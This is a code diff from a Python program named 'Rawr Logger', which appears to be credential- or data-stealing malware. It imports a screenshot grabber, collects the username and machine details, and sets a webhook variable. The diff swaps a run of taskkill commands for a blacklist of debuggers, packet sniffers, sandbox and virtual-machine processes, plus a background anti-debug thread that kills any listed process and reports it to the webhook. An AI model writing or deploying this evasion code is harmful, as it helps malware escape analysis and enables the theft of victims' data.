@@ -4,43 +4,53 @@ import re, uuid
 from pystyle import *
 from PIL import ImageGrab
 
-os.system(f'cls & title Rawr Logger!')
-os.system("taskkill /f /im  ProcessHacker.exe")
-os.system('cls')
-os.system("taskkill /f /im  phacker.exe")
-os.system('cls')
-os.system("taskkill /f /im  dnspy.exe")
-os.system('cls')
-os.system("taskkill /f /im  dnSpy.exe")
-os.system('cls')
-os.system("taskkill /f /im  wireshark.exe")
-os.system('cls')
-os.system("taskkill /f /im  Fiddler.exe")
-os.system('cls')
-os.system("taskkill /f /im  cmd.exe")
-os.system('cls')
-os.system("taskkill /f /im  taskmgr")
-os.system('cls')
-os.system("taskkill /f /im  vboxservice")
-os.system('cls')
-os.system("taskkill /f /im  vboxservice.exe")
-os.system('cls')
-os.system("taskkill /f /im  vboxtray")
-os.system('cls')
-os.system("taskkill /f /im  joeboxcontrol")
-os.system('cls')
-os.system("taskkill /f /im  x96dbg.exe")
-os.system('cls')
-os.system("taskkill /f /im  vmsrvc.exe")
-os.system('cls')
-os.system("taskkill /f /im  vmwareuser.exe")
-os.system('cls')
-os.system("taskkill /f /im  vgauthservice.exe")
-os.system('cls')
-os.system("taskkill /f /im  vmacthlp.exe")
-os.system('cls')
-os.system("taskkill /f /im  vmtoolsd.exe")
-os.system('cls')
+
+program_blacklist = [
+    "httpdebuggerui.exe", 
+    "wireshark.exe", 
+    "HTTPDebuggerSvc.exe", 
+    "fiddler.exe", 
+    "regedit.exe", 
+    "taskmgr.exe", 
+    "vboxservice.exe", 
+    "df5serv.exe", 
+    "processhacker.exe", 
+    "vboxtray.exe", 
+    "vmtoolsd.exe", 
+    "vmwaretray.exe", 
+    "ida64.exe", 
+    "ollydbg.exe",
+    "pestudio.exe", 
+    "vmwareuser", 
+    "vgauthservice.exe", 
+    "vmacthlp.exe", 
+    "x96dbg.exe", 
+    "vmsrvc.exe", 
+    "x32dbg.exe", 
+    "vmusrvc.exe", 
+    "prl_cc.exe", 
+    "prl_tools.exe", 
+    "xenservice.exe", 
+    "qemu-ga.exe", 
+    "joeboxcontrol.exe", 
+    "ksdumperclient.exe", 
+    "ksdumper.exe",
+    "joeboxserver.exe"
+]
+
+def anti_debug():
+    while True:
+        time.sleep(1)
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in program_blacklist):
+                try:
+                    post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...")
+                    proc.kill()
+                    os._exit(1)
+                except(psutil.NoSuchProcess, psutil.AccessDenied): pass
+
+threading.Thread(name='Anti-Debug', target=anti_debug).start()
+                        
 u = os.getlogin()
 webhook = "Webhooksss"
 machines = platform.uname()
